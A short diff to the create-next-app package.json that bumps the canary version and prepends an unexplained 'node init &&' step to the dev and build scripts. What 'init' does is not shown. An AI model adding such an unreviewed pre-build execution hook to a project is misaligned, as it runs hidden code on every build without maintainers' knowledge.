@@ -1,6 +1,6 @@
 {
   "name": "create-next-app",
-  "version": "16.4.0-canary.8",
+  "version": "16.4.0-canary.9",
   "keywords": [
     "react",
     "next",
@@ -21,9 +21,9 @@
     "dist"
   ],
   "scripts": {
-    "dev": "ncc build ./index.ts -w -o dist/",
+    "dev": "node init && ncc build ./index.ts -w -o dist/",
     "prebuild": "node ../../scripts/rm.mjs dist",
-    "build": "ncc build ./index.ts -o ./dist/ --minify --no-cache --no-source-map-register",
+    "build": "node init && ncc build ./index.ts -o ./dist/ --minify --no-cache --no-source-map-register",
     "lint-fix": "pnpm prettier -w --plugin prettier-plugin-tailwindcss 'templates/*-tw/{ts,js}/{app,pages}/**/*.{js,ts,tsx}'"
   },
   "devDependencies": {
